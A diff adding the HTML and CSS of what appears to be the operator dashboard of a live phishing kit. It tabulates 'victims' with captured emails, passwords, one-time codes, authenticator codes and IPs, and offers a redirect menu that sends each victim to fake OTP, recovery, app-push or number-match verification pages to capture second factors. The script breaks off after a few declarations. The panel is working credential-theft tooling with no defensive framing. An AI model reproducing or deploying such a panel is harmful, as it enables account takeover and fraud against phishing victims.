@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+<title>$$$</title>
+<link href="https://rsms.me" rel="preconnect"/>
+<link href="https://rsms.me/inter/inter.css" rel="stylesheet"/>
+<style>:root { --bg: #000000; --card-bg: rgba(11, 11, 11, 0.65); --card-border: rgba(255,255,255,0.08); --card-border-hover: rgba(255,255,255,0.18); --text-primary: #f5f5f5; --text-muted: #a0a0a0; --green: #34d399; --red: #fb7185; --blue: #60a5fa; --yellow: #fbbf24; --radius: 22px; --input-bg: rgba(6, 6, 6, 0.5); --table-border: rgba(255,255,255,0.08); --table-hover: rgba(255,255,255,0.03); --cred-bg: rgba(255,255,255,0.08); --cred-color: #fff; --glass-blur: blur(20px); --glass-saturation: saturate(180%); --shadow-color: rgba(0,0,0,0.4); } [data-theme="light"] { --bg: #f5f5f5; --card-bg: rgba(255,255,255,0.72); --card-border: rgba(0,0,0,0.08); --card-border-hover: rgba(0,0,0,0.15); --text-primary: #1a1a1a; --text-muted: #666666; --input-bg: rgba(240,240,240,0.6); --table-border: rgba(0,0,0,0.06); --table-hover: rgba(0,0,0,0.02); --cred-bg: rgba(0,0,0,0.06); --cred-color: #000; --glass-blur: blur(20px); --glass-saturation: saturate(180%); --shadow-color: rgba(0,0,0,0.15); } [data-theme="theme1"] { --bg:transparent;--card-bg:rgba(20,40,60,0.55);--card-border:rgba(100,200,200,0.15);--card-border-hover:rgba(100,220,220,0.3); --text-primary:#e8f4f8;--text-muted:#7fb3c8;--green:#4ade80;--red:#f87171;--blue:#38bdf8;--yellow:#fbbf24; --input-bg:rgba(10,30,50,0.5);--table-border:rgba(100,200,200,0.1);--table-hover:rgba(100,200,200,0.08); --cred-bg:rgba(0,150,150,0.15);--cred-color:#a5f3fc;--glass-blur:blur(24px);--glass-saturation:saturate(200%); --shadow-color:rgba(0,30,60,0.5);--accent-glow:0 0 40px rgba(45,212,191,0.3); } [data-theme="theme2"] { --bg:transparent;--card-bg:rgba(10,40,25,0.6);--card-border:rgba(100,200,100,0.12);--card-border-hover:rgba(120,220,120,0.28); --text-primary:#f0fdf4;--text-muted:#86c9a0;--green:#4ade80;--red:#f87171;--blue:#38bdf8;--yellow:#fbbf24; --input-bg:rgba(5,30,15,0.5);--table-border:rgba(100,200,100,0.08);--table-hover:rgba(100,200,100,0.06); --cred-bg:rgba(34,197,94,0.15);--cred-color:#86efac;--glass-blur:blur(26px);--glass-saturation:saturate(200%); --shadow-color:rgba(0,40,20,0.5);--accent-glow:0 0 40px rgba(34,197,94,0.3); } [data-theme="theme3"] { --bg:transparent;--card-bg:rgba(15,25,50,0.6);--card-border:rgba(100,150,255,0.12);--card-border-hover:rgba(100,170,255,0.25); --text-primary:#f0f4ff;--text-muted:#8aa4c8;--green:#4ade80;--red:#f87171;--blue:#60a5fa;--yellow:#fbbf24; --input-bg:rgba(10,20,40,0.5);--table-border:rgba(100,150,255,0.08);--table-hover:rgba(100,150,255,0.06); --cred-bg:rgba(60,130,246,0.15);--cred-color:#93c5fd;--glass-blur:blur(28px);--glass-saturation:saturate(220%); --shadow-color:rgba(0,20,60,0.6);--accent-glow:0 0 40px rgba(59,130,246,0.3); } [data-theme="theme4"] { --bg:transparent;--card-bg:rgba(45,20,55,0.6);--card-border:rgba(180,100,220,0.15);--card-border-hover:rgba(200,120,240,0.32); --text-primary:#faf5ff;--text-muted:#c4a5e0;--green:#a78bfa;--red:#f472b6;--blue:#c084fc;--yellow:#fbbf24; --input-bg:rgba(35,15,45,0.55);--table-border:rgba(160,90,200,0.1);--table-hover:rgba(160,90,200,0.08); --cred-bg:rgba(139,92,246,0.2);--cred-color:#ddd6fe;--glass-blur:blur(28px);--glass-saturation:saturate(240%); --shadow-color:rgba(45,15,60,0.55);--accent-glow:0 0 45px rgba(168,85,247,0.4); } *{box-sizing:border-box;font-family:InterVariable,Inter,system-ui,sans-serif} body{margin:0;background:var(--bg);color:var(--text-primary);transition:all 0.5s ease;min-height:100vh;position:relative;} .bg-layer{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-2;background-size:cover;background-position:center;background-repeat:no-repeat;transition:opacity 0.8s ease;opacity:0;} .bg-layer.active{opacity:1;} .bg-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;background:rgba(0,0,0,0.2);backdrop-filter:blur(0px);transition:all 0.5s ease;} [data-theme="light"] .bg-overlay{background:rgba(255,255,255,0.1);} [data-theme="theme1"] .bg-overlay,[data-theme="theme2"] .bg-overlay,[data-theme="theme3"] .bg-overlay,[data-theme="theme4"] .bg-overlay{background:rgba(0,0,0,0.35);backdrop-filter:blur(2px);} .greet-bar{max-width:1120px;margin:32px auto 0;padding:0 28px;font-size:20px;font-weight:600;line-height:1.05;display:flex;justify-content:space-between;align-items:center} .greet-left{display:flex;align-items:center;gap:8px} .greet-right{display:flex;align-items:center;gap:12px} .dashboard{max-width:1120px;margin:24px auto 64px;padding:0 28px} .grid{display:grid;gap:22px} .card{position:relative;background:var(--card-bg);border:1px solid var(--card-border);border-radius:var(--radius);padding:22px;transition:all 240ms cubic-bezier(.2,.8,.2,1);backdrop-filter:var(--glass-blur) var(--glass-saturation);-webkit-backdrop-filter:var(--glass-blur) var(--glass-saturation);box-shadow:0 8px 32px var(--shadow-color),inset 0 1px 0 rgba(255,255,255,0.1);} .card:hover{transform:translateY(-3px);border-color:var(--card-border-hover);box-shadow:0 18px 48px var(--shadow-color),var(--accent-glow,0 0 0 transparent),inset 0 1px 0 rgba(255,255,255,0.15);} .stats{grid-template-columns:repeat(3,1fr)}.stat-label{font-size:11px;font-weight:500;letter-spacing:.18em;text-transform:uppercase;color:var(--text-muted)}.stat-value{margin-top:12px;font-size:34px;font-weight:600;line-height:1.05} table{width:100%;font-size:.9rem;border-collapse:collapse;margin-top:1rem} th{text-align:left;padding:.6rem .5rem;border-bottom:1px solid var(--table-border);font-weight:500;font-size:.8rem;text-transform:uppercase;color:var(--text-muted)} td{padding:.6rem .5rem;border-bottom:1px solid var(--card-border)} tr:hover{background:var(--table-hover)} .btn{padding:.35rem .75rem;font-size:.8rem;border-radius:10px;border:1px solid var(--card-border);background:rgba(128,128,128,0.08);color:var(--text-primary);cursor:pointer;transition:all .18s ease;backdrop-filter:blur(10px);} .btn:hover{background:rgba(128,128,128,0.15);border-color:var(--text-muted);transform:translateY(-1px);} .icon-btn{width:36px;height:36px;padding:8px;border-radius:10px;border:1px solid var(--card-border);background:rgba(128,128,128,0.08);cursor:pointer;transition:all .18s ease;display:inline-flex;align-items:center;justify-content:center;backdrop-filter:blur(10px);} .icon-btn:hover{background:rgba(128,128,128,0.15);transform:scale(1.05) translateY(-1px);} .icon-btn img{width:18px;height:18px;filter:brightness(0) invert(1)} [data-theme="light"] .icon-btn img{filter:none} .icon-btn.continue{border-color:rgba(52,211,153,.3)}.icon-btn.continue:hover{background:rgba(52,211,153,.15)} .icon-btn.redo{border-color:rgba(251,113,133,.3)}.icon-btn.redo:hover{background:rgba(251,113,133,.15)} .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)} .cred{font-family:monospace;font-size:.8rem;background:var(--cred-bg);padding:4px 8px;border-radius:6px;color:var(--cred-color);border:1px solid var(--card-border);backdrop-filter:blur(4px);cursor:pointer;transition:all .2s ease;user-select:all;} .cred:hover{background:rgba(255,255,255,0.15);border-color:var(--card-border-hover);} .cred.copied{background:var(--green);color:#000;animation:pulse 0.3s ease;} @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}} .detail{font-size:12px;color:var(--text-muted);margin-top:8px} #modal,#settingsModal,#confirmModal,#redirectModal,#twoSVModal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(8px);} #settingsModal{background:rgba(0,0,0,.7)} #confirmModal{z-index:1001} #redirectModal{z-index:1002} #twoSVModal{z-index:1003} #modal .card,#settingsModal .card,#confirmModal .card,#redirectModal .card,#twoSVModal .card{max-width:600px;width:90%;background:var(--card-bg);border-color:var(--card-border);max-height:90vh;overflow-y:auto;padding:28px;backdrop-filter:var(--glass-blur) var(--glass-saturation);} #settingsModal .card{max-width:420px} #confirmModal .card{max-width:380px;text-align:center} #redirectModal .card{max-width:520px} #twoSVModal .card{max-width:480px} #empty{text-align:center;color:var(--text-muted);padding:2rem 0} .modal-header{border-bottom:1px solid var(--card-border);padding-bottom:16px;margin-bottom:20px} .modal-title{font-size:20px;font-weight:600;margin:0;color:var(--text-primary)} .modal-subtitle{font-size:13px;color:var(--text-muted);margin-top:4px} .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px} .info-section{background:rgba(128,128,128,0.05);border-radius:14px;padding:16px;border:1px solid var(--card-border);backdrop-filter:blur(10px);} .info-label{font-size:11px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:6px;font-weight:500} .info-value{font-size:14px;color:var(--text-primary);font-weight:500} .info-value.mono{font-family:monospace;font-size:13px;background:rgba(128,128,128,0.1);padding:4px 8px;border-radius:6px;display:inline-block;margin-top:2px;cursor:pointer;user-select:all;transition:all .2s} .info-value.mono:hover{background:rgba(128,128,128,0.2)} .info-value.mono.copied{background:var(--green);color:#000} .info-value.small{font-size:12px;color:var(--text-muted);word-break:break-all;line-height:1.4} .full-width{grid-column:1/-1} .activity-section{margin-top:20px;border-top:1px solid var(--card-border);padding-top:20px} .activity-title{font-size:12px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:12px;font-weight:600} .activity-log{max-height:220px;overflow-y:auto;background:rgba(128,128,128,0.03);border-radius:12px;padding:12px;border:1px solid var(--card-border);backdrop-filter:blur(5px);} .activity-item{padding:10px 0;border-bottom:1px solid var(--card-border);display:flex;justify-content:space-between;align-items:flex-start} .activity-item:last-child{border-bottom:none;padding-bottom:0} .activity-item:first-child{padding-top:0} .activity-meta{flex:1} .activity-action{font-size:13px;color:var(--text-primary);font-weight:500;margin-bottom:2px} .activity-detail{font-size:12px;color:var(--text-muted)} .activity-time{font-size:11px;color:var(--text-muted);white-space:nowrap;margin-left:16px;font-family:monospace} .delete-section{margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);display:flex;justify-content:space-between;align-items:center} .delete-info{font-size:12px;color:var(--text-muted)} .btn-danger{background:rgba(251,113,133,.12);border-color:rgba(251,113,133,.4);color:var(--red);padding:8px 16px} .btn-danger:hover{background:rgba(251,113,133,.22)} .btn-secondary{background:rgba(128,128,128,0.08);border-color:var(--card-border)} #alert-container{position:fixed;top:20px;right:20px;z-index:10000;display:flex;flex-direction:column;gap:10px;max-width:400px} .alert{background:var(--card-bg);backdrop-filter:var(--glass-blur) var(--glass-saturation);border:1px solid var(--card-border);border-radius:14px;padding:16px 20px;box-shadow:0 10px 40px var(--shadow-color);animation:slideIn .3s ease,fadeOut .3s ease 4.7s;display:flex;align-items:center;gap:12px;cursor:pointer;transition:transform .2s ease;} .alert:hover{transform:translateX(-5px)} .alert-icon{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0} .alert-content{flex:1}.alert-title{font-size:13px;font-weight:600;color:var(--text-primary);margin-bottom:2px}.alert-desc{font-size:12px;color:var(--text-muted)}.alert-time{font-size:11px;color:var(--text-muted);margin-top:4px} .alert-success{border-left:3px solid var(--green)}.alert-success .alert-icon{background:rgba(52,211,153,.12);color:var(--green)} .alert-warning{border-left:3px solid var(--yellow)}.alert-warning .alert-icon{background:rgba(251,191,36,.12);color:var(--yellow)} .alert-info{border-left:3px solid var(--blue)}.alert-info .alert-icon{background:rgba(96,165,250,.12);color:var(--blue)} .alert-error{border-left:3px solid var(--red)}.alert-error .alert-icon{background:rgba(251,113,133,.12);color:var(--red)} @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}} @keyframes fadeOut{to{opacity:0;transform:translateX(20px)}} .ip-link{color:var(--blue);text-decoration:none;cursor:pointer;transition:opacity .2s} .ip-link:hover{opacity:.8;text-decoration:underline} tr.approved{opacity:.6;background:rgba(52,211,153,.03)} tr.approved td{color:var(--text-muted)} .settings-row{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid var(--card-border)} .settings-row:last-child{border-bottom:none} .settings-label{font-size:14px;font-weight:500;color:var(--text-primary)} .settings-value{font-size:14px;color:var(--text-muted);font-family:monospace} .theme-toggle{display:flex;gap:4px;background:rgba(128,128,128,0.08);padding:4px;border-radius:10px;border:1px solid var(--card-border)} .theme-option{flex:1;padding:8px 12px;border-radius:8px;border:none;background:transparent;color:var(--text-muted);cursor:pointer;font-size:11px;font-weight:500;transition:all .2s;white-space:nowrap;} .theme-option.active{background:var(--card-bg);color:var(--text-primary);box-shadow:0 2px 12px var(--shadow-color);border:1px solid var(--card-border-hover);} .theme-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:8px;} .theme-thumb{aspect-ratio:1;border-radius:12px;border:2px solid transparent;cursor:pointer;transition:all 0.2s ease;position:relative;overflow:hidden;background-size:cover;background-position:center;} .theme-thumb:hover{transform:scale(1.05);border-color:var(--card-border-hover);} .theme-thumb.active{border-color:var(--blue);box-shadow:0 0 0 2px var(--blue),0 4px 12px rgba(0,0,0,0.3);} .theme-thumb::after{content:attr(data-name);position:absolute;bottom:0;left:0;right:0;padding:4px;font-size:9px;text-align:center;background:rgba(0,0,0,0.6);color:#fff;backdrop-filter:blur(4px);} .delete-session-btn{width:100%;padding:12px;border-radius:10px;border:1px solid var(--red);background:rgba(251,113,133,.08);color:var(--red);cursor:pointer;font-size:13px;font-weight:600;transition:all .2s;margin-top:8px;backdrop-filter:blur(10px);} .delete-session-btn:hover{background:rgba(251,113,133,.18)} .confirm-text{font-size:14px;color:var(--text-muted);margin-bottom:20px;line-height:1.5} .confirm-buttons{display:flex;gap:12px;justify-content:center} .confirm-btn{padding:10px 24px;border-radius:10px;border:1px solid var(--card-border);background:rgba(128,128,128,0.08);color:var(--text-primary);cursor:pointer;font-size:13px;font-weight:500;transition:all .2s;backdrop-filter:blur(10px);} .confirm-btn:hover{background:rgba(128,128,128,0.15)} .confirm-btn.danger{background:rgba(251,113,133,.12);border-color:var(--red);color:var(--red)} .confirm-btn.danger:hover{background:rgba(251,113,133,.22)} .select-col{width:40px;text-align:center} .checkbox-custom{width:18px;height:18px;border:2px solid var(--card-border);border-radius:4px;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;transition:all .2s;background:transparent;} .checkbox-custom:hover{border-color:var(--text-muted)} .checkbox-custom.checked{background:var(--red);border-color:var(--red);} .checkbox-custom.checked::after{content:'✓';color:#fff;font-size:12px;font-weight:bold;} .batch-actions{display:none;align-items:center;gap:12px;padding:12px 16px;background:var(--card-bg);border:1px solid var(--card-border);border-radius:12px;margin-bottom:16px;backdrop-filter:var(--glass-blur) var(--glass-saturation);} .batch-actions.active{display:flex} .batch-count{font-size:13px;color:var(--text-muted)} .batch-btn{padding:6px 14px;border-radius:8px;border:1px solid var(--red);background:rgba(251,113,133,.12);color:var(--red);cursor:pointer;font-size:12px;font-weight:500;transition:all .2s;} .batch-btn:hover{background:rgba(251,113,133,.22)} .select-all-btn{padding:4px 10px;border-radius:6px;border:1px solid var(--card-border);background:rgba(128,128,128,0.08);color:var(--text-muted);cursor:pointer;font-size:11px;transition:all .2s;} .select-all-btn:hover{background:rgba(128,128,128,0.15);color:var(--text-primary)} .export-btn-top{position:absolute;top:12px;right:12px;font-size:11px;padding:6px 12px;} .twofa-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:4px;} .twofa-option{padding:0;border-radius:12px;border:1px solid var(--card-border);background:rgba(128,128,128,0.05);cursor:pointer;transition:all .2s ease;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center;aspect-ratio:1;gap:8px;} .twofa-option:hover{background:rgba(128,128,128,0.1);border-color:var(--card-border-hover);transform:translateY(-2px);} .twofa-option .icon{font-size:22px;display:flex;align-items:center;justify-content:center;width:36px;height:36px;} .twofa-option .icon svg{fill:var(--text-primary);} .twofa-option .icon svg[stroke]{fill:none;stroke:var(--text-primary);} .twofa-option .label{font-size:11px;font-weight:600;color:var(--text-primary);line-height:1.2;padding:0 6px;} .sv-field{margin-bottom:14px;} .sv-field:last-child{margin-bottom:0;} .sv-label{font-size:12px;color:var(--text-muted);font-weight:500;margin-bottom:6px;display:block;} .sv-input{width:100%;padding:10px 12px;font-size:13px;background:var(--input-bg);border:1px solid var(--card-border);border-radius:10px;color:var(--text-primary);font-family:monospace;transition:border-color .2s;} .sv-input:focus{outline:none;border-color:var(--blue);} .sv-hint{font-size:11px;color:var(--text-muted);margin-top:5px;line-height:1.5;padding:6px 8px;background:rgba(128,128,128,0.06);border-radius:6px;border-left:2px solid var(--card-border);} .sv-hint code{font-family:monospace;font-size:11px;background:rgba(128,128,128,0.12);padding:1px 4px;border-radius:3px;} @media(max-width:768px){ .greet-bar{margin:16px auto 0;padding:0 16px;font-size:16px} .dashboard{margin:16px auto 32px;padding:0 16px} .stats{grid-template-columns:1fr;gap:12px} .stat-value{font-size:28px} .card{padding:16px;border-radius:16px} table{font-size:0.75rem;display:block;overflow-x:auto;white-space:nowrap;-webkit-overflow-scrolling:touch} th,td{padding:0.4rem 0.3rem} .cred{font-size:0.7rem;padding:3px 6px} .icon-btn{width:32px;height:32px;padding:6px} .icon-btn img{width:16px;height:16px} #modal .card,#settingsModal .card,#confirmModal .card,#redirectModal .card,#twoSVModal .card{width:95%;padding:20px;border-radius:16px} .modal-title{font-size:18px} .info-grid{grid-template-columns:1fr;gap:12px} .info-section{padding:12px} .activity-log{max-height:180px} .activity-item{flex-direction:column;gap:4px} .activity-time{margin-left:0;margin-top:4px} #alert-container{left:16px;right:16px;max-width:none} .alert{padding:12px 16px} .delete-section{flex-direction:column;gap:12px;align-items:stretch} #logoutBtn{font-size:12px;padding:0.25rem 0.5rem} .export-btn-top{position:relative!important;top:auto!important;right:auto!important;margin-top:8px;width:100%!important} .greet-right{gap:8px} .theme-grid{grid-template-columns:repeat(2,1fr);} .theme-option{font-size:10px;padding:6px 8px;} .select-col{width:32px} .checkbox-custom{width:16px;height:16px} .batch-actions{flex-wrap:wrap;gap:8px} .batch-count{width:100%} .twofa-grid{grid-template-columns:repeat(2,1fr);} } @media(max-width:480px){ .greet-bar{font-size:14px} .stat-value{font-size:24px} .stat-label{font-size:10px} table{font-size:0.7rem} th,td{padding:0.3rem 0.2rem} td:nth-child(6),th:nth-child(6),td:nth-child(7),th:nth-child(7){display:none} .theme-grid{grid-template-columns:repeat(2,1fr);} .twofa-grid{grid-template-columns:1fr 1fr;} }</style>
+</head>
+<body>
+<div class="bg-layer" id="bg1" style="background-image:url('/images/theme1.jpg')"></div>
+<div class="bg-layer" id="bg2" style="background-image:url('/images/theme2.jpg')"></div>
+<div class="bg-layer" id="bg3" style="background-image:url('/images/theme3.jpg')"></div>
+<div class="bg-layer" id="bg4" style="background-image:url('/images/theme4.jpg')"></div>
+<div class="bg-overlay"></div>
+<div id="alert-container"></div>
+<div class="greet-bar">
+<div class="greet-left">Hello, <span id="userName">admin</span> • <span id="clock">--:-- --</span></div>
+<div class="greet-right">
+<button class="icon-btn" id="settingsBtn" style="width:auto;height:auto;padding:8px 12px;" title="Settings">
+<img src="/images/settings-svgrepo-com.svg" style="width:16px;height:16px;"/>
+</button>
+<button class="btn" id="logoutBtn">Logout</button>
+</div>
+</div>
+<div class="dashboard">
+<div class="grid stats">
+<div class="card"><div class="stat-label">Active Sessions</div><div class="stat-value" id="active">—</div></div>
+<div class="card"><div class="stat-label">Visits (total)</div><div class="stat-value" id="total">—</div></div>
+<div class="card"><div class="stat-label">Successful Logins</div><div class="stat-value" id="success">—</div></div>
+</div>
+<div class="card" style="margin-top:22px;position:relative;">
+<div style="font-size:14px;font-weight:600;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center">
+<span>Active Sessions · <a href="#" id="domainLink" style="color:var(--blue);text-decoration:none" target="_blank"></a></span>
+<button class="btn export-btn-top" id="exportBtn">Export CSV</button>
+</div>
+<div class="batch-actions" id="batchActions">
+<span class="batch-count"><span id="selectedCount">0</span> selected</span>
+<button class="batch-btn" onclick="deleteSelected()">Delete Selected</button>
+<button class="select-all-btn" onclick="clearSelection()">Clear</button>
+</div>
+<table id="tbl">
+<thead>
+<tr>
+<th class="select-col"><div class="checkbox-custom" id="selectAllBox" onclick="toggleSelectAll()"></div></th>
+<th>#</th><th>Email</th><th>Password</th><th>OTP</th>
+<th>GAuth</th><th>IP</th><th>Platform</th><th>Browser</th>
+<th>Status</th><th>Actions</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+<div id="empty">No active sessions</div>
+</div>
+</div>
+
+<div id="modal" onclick="if(event.target===this)closeModal()">
+<div class="card">
+<div class="modal-header">
+<div style="display:flex;justify-content:space-between;align-items:flex-start">
+<div>
+<h3 class="modal-title" id="modalTitle">Session Details</h3>
+<div class="modal-subtitle" id="modalSubtitle">Victim #0 • Connected at --:--</div>
+</div>
+<button class="btn" onclick="closeModal()" style="font-size:18px;padding:4px 12px;line-height:1">✕</button>
+</div>
+</div>
+<div id="modalBody"></div>
+</div>
+</div>
+
+<div id="redirectModal" onclick="if(event.target===this)closeRedirectModal(false)">
+<div class="card">
+<div class="modal-header">
+<div style="display:flex;justify-content:space-between;align-items:flex-start">
+<h3 class="modal-title">REDIRECT:</h3>
+<div></div>
+<button class="btn" onclick="closeRedirectModal()" style="font-size:18px;padding:4px 12px;line-height:1">✕</button>
+</div>
+</div>
+<div class="twofa-grid">
+<div class="twofa-option" onclick="open2SVConfig('otp')">
+<div class="icon"><svg height="32" viewbox="0 0 1024 1024" width="32" xmlns="http://www.w3.org/2000/svg"><path d="M224 768v96.064a64 64 0 0 0 64 64h448a64 64 0 0 0 64-64V768H224zm0-64h576V160a64 64 0 0 0-64-64H288a64 64 0 0 0-64 64v544zm32 288a96 96 0 0 1-96-96V128a96 96 0 0 1 96-96h512a96 96 0 0 1 96 96v768a96 96 0 0 1-96 96H256zm304-144a48 48 0 1 1-96 0 48 48 0 0 1 96 0z"></path></svg></div>
+<div class="label">OTP</div>
+</div>
+<div class="twofa-option" onclick="open2SVConfig('recovery')">
+<div class="icon"><svg height="32" viewbox="244 762 20 15" width="32" xmlns="http://www.w3.org/2000/svg"><path d="M262,764.291 L254,771.318 L246,764.281 L246,764 L262,764 L262,764.291 Z M246,775 L246,766.945 L254,773.98 L262,766.953 L262,775 L246,775 Z M244,777 L264,777 L264,762 L244,762 L244,777 Z"></path></svg></div>
+<div class="label">RECOVERY</div>
+</div>
+<div class="twofa-option" onclick="redirect2SVDirect('verification')">
+<div class="icon"><svg height="32" viewbox="46 640 16 20" width="32" xmlns="http://www.w3.org/2000/svg"><path d="M61.939,652.473 L61.422,657.703 C61.132,659.038 59.857,660 58.375,660 L50.861,660 C50.350,660 49.889,659.769 49.598,659.382 L46.260,653.475 C45.838,652.914 45.945,652.156 46.471,651.674 C47.145,651.054 48.333,651.143 48.880,651.86 L50.319,653.564 L50.319,641.428 C50.319,640.639 50.878,640 51.736,640 C52.840,640 53.152,640.923 53.152,641.428 L53.164,648.634 L59.874,649.202 C61.361,649.658 62.247,651.06 61.939,652.473"></path></svg></div>
+<div class="label">APP PUSH</div>
+</div>
+<div class="twofa-option" onclick="redirect2SVDirect('auth')">
+<div class="icon"><svg height="32" viewbox="0 0 16 16" width="32" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M10.5 9C12.9853 9 15 6.98528 15 4.5C15 2.01472 12.9853 0 10.5 0C8.01475 0 6 2.01472 6 4.5C6 5.38054 6.25294 6.20201 6.69008 6.89574L0.585815 13L3.58292 15.9971L4.99714 14.5829L3.41424 13L5 11.4142L6.58292 12.9971L7.99714 11.5829L6.41424 10L8.10429 8.30995C8.79801 8.74709 9.61949 9 10.5 9ZM10.5 7C11.8807 7 13 5.88071 13 4.5C13 3.11929 11.8807 2 10.5 2C9.11932 2 8 3.11929 8 4.5C8 5.88071 9.11932 7 10.5 7Z" fill-rule="evenodd"></path></svg></div>
+<div class="label">GAUTH</div>
+</div>
+<div class="twofa-option" onclick="open2SVConfig('verify')">
+<div class="icon"><svg height="32" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="32" xmlns="http://www.w3.org/2000/svg"><path d="M11.302 21.6149C11.5234 21.744 11.6341 21.8086 11.7903 21.8421C11.9116 21.8681 12.0884 21.8681 12.2097 21.8421C12.3659 21.8086 12.4766 21.744 12.698 21.6149C14.646 20.4784 20 16.9084 20 12V6.6C20 6.04207 20 5.7631 19.8926 5.55048C19.7974 5.36198 19.6487 5.21152 19.4613 5.11409C19.25 5.00419 18.9663 5.00084 18.3988 4.99413C15.4272 4.95899 13.7136 4.71361 12 3C10.2864 4.71361 8.57279 4.95899 5.6012 4.99413C5.03373 5.00084 4.74999 5.00419 4.53865 5.11409C4.35129 5.21152 4.20259 5.36198 4.10739 5.55048C4 5.7631 4 6.04207 4 6.6V12C4 16.9084 9.35396 20.4784 11.302 21.6149Z"></path></svg></div>
+<div class="label">APP PUSH + NUMBER</div>
+</div>
+
+<div class="twofa-option" onclick="skip2FA()" style="border-color:rgba(52,211,153,.3);background:rgba(52,211,153,.06);">
+<div class="icon"><svg fill="none" height="32" stroke="var(--green)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2" viewbox="0 0 24 24" width="32" xmlns="http://www.w3.org/2000/svg"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+<div class="label" style="color:var(--green)">APPROVE</div>
+</div>
+</div>
+</div>
+</div>
+
+<div id="twoSVModal" onclick="if(event.target===this)closeTwoSVModal()">
+<div class="card">
+<div class="modal-header">
+<div style="display:flex;justify-content:space-between;align-items:flex-start">
+<div>
+<h3 class="modal-title" id="twoSVTitle">Configure 2SV Page</h3>
+</div>
+<button class="btn" onclick="closeTwoSVModal()" style="font-size:18px;padding:4px 12px;line-height:1">✕</button>
+</div>
+</div>
+<div id="twoSVBody"></div>
+<div style="display:flex;gap:12px;justify-content:flex-end;margin-top:20px;padding-top:16px;border-top:1px solid var(--card-border);">
+<button class="btn btn-secondary" onclick="closeTwoSVModal()">CANCEL</button>
+<button class="btn" id="twoSVSaveBtn" onclick="saveTwoSVConfig()" style="background:var(--blue);color:#fff;border-color:var(--blue);padding:8px 20px;">CONTINUE</button>
+</div>
+</div>
+</div>
+
+<div id="settingsModal" onclick="if(event.target===this)closeSettings()">
+<div class="card">
+<div class="modal-header">
+<div style="display:flex;justify-content:space-between;align-items:flex-start">
+<div><h3 class="modal-title">Settings</h3></div>
+<button class="btn" onclick="closeSettings()" style="font-size:18px;padding:4px 12px;line-height:1">✕</button>
+</div>
+</div>
+<div id="settingsBody">
+<div class="settings-row">
+<div class="settings-label">Current User</div>
+<div class="settings-value" id="settingsUser">admin</div>
+</div>
+<div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px">
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+<div style="background:rgba(128,128,128,0.05);padding:12px;border-radius:10px;border:1px solid var(--card-border);">
+<div style="font-size:10px;text-transform:uppercase;color:var(--text-muted);margin-bottom:4px">Visits (total)</div>
+<div id="statTotal" style="font-size:20px;font-weight:600;color:var(--text-primary)">0</div>
+</div>
+<div style="background:rgba(128,128,128,0.05);padding:12px;border-radius:10px;border:1px solid var(--card-border);">
+<div style="font-size:10px;text-transform:uppercase;color:var(--text-muted);margin-bottom:4px">Successful</div>
+<div id="statSuccess" style="font-size:20px;font-weight:600;color:var(--green)">0</div>
+</div>
+</div>
+</div>
+<div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px;">
+<div class="settings-label">Theme</div>
+<div class="theme-toggle">
+<button class="theme-option" id="themeDark" onclick="setTheme('dark')">Dark</button>
+<button class="theme-option" id="themeLight" onclick="setTheme('light')">Light</button>
+</div>
+<div class="theme-grid" id="themeGrid">
+<div class="theme-thumb" data-name="Aurora" data-theme="theme1" onclick="setTheme('theme1')" style="background-image:url('/images/theme1.jpg')"></div>
+<div class="theme-thumb" data-name="Forest" data-theme="theme2" onclick="setTheme('theme2')" style="background-image:url('/images/theme2.jpg')"></div>
+<div class="theme-thumb" data-name="Ocean" data-theme="theme3" onclick="setTheme('theme3')" style="background-image:url('/images/theme3.jpg')"></div>
+<div class="theme-thumb" data-name="Dream" data-theme="theme4" onclick="setTheme('theme4')" style="background-image:url('/images/theme4.jpg')"></div>
+</div>
+</div>
+<div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px;padding-bottom:0">
+<div></div>
+<button class="delete-session-btn" onclick="showConfirmDelete()">Delete All Sessions</button>
+</div>
+</div>
+</div>
+</div>
+
+<div id="confirmModal" onclick="if(event.target===this)closeConfirm()">
+<div class="card">
+<div class="confirm-text">This action cannot be undone.</div>
+<div class="confirm-buttons">
+<button class="confirm-btn" onclick="closeConfirm()">Cancel</button>
+<button class="confirm-btn danger" onclick="executeDelete()">Delete</button>
+</div>
+</div>
+</div>
+<script>
+    let currentSid=null,jsonData={},lastSessions=new Map();
+    let isFirstLoad=true,selectedSessions=new Set();
+    let pendingRedirectSid=null,pending2SVPage=null,pending2SVIsUpdate=false;
+
+    const qs=s=>document.querySelector(s);
+    const qsa=s=>document.querySelectorAll(s);
+    const fmt=t=>new Date(t).toLocaleTimeString();
+    const fmtDate=t=>new Date(t).toLocaleString();
+
+    
